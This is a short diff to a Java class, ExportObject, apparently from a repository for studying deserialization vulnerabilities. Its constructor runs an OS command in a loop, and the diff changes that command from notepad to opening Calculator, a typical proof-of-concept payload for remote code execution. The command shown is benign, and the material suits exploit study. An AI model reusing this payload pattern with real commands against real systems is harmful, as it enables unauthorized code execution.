@@ -1,4 +1,4 @@
-package com.github.ruanshengwei.javalang.serialization.deserialization.bug;
+package com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring;
 
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
@@ -20,8 +20,8 @@ public class ExportObject {
     public ExportObject() throws Exception {
         try {
             while(true) {
-                String cmd="notepad";
-                throw new Exception(exec(cmd));
+                String cmd="open /Applications/Calculator.app/";
+                exec(cmd);
 //                Thread.sleep(1000);
             }
         } catch(Exception e) {
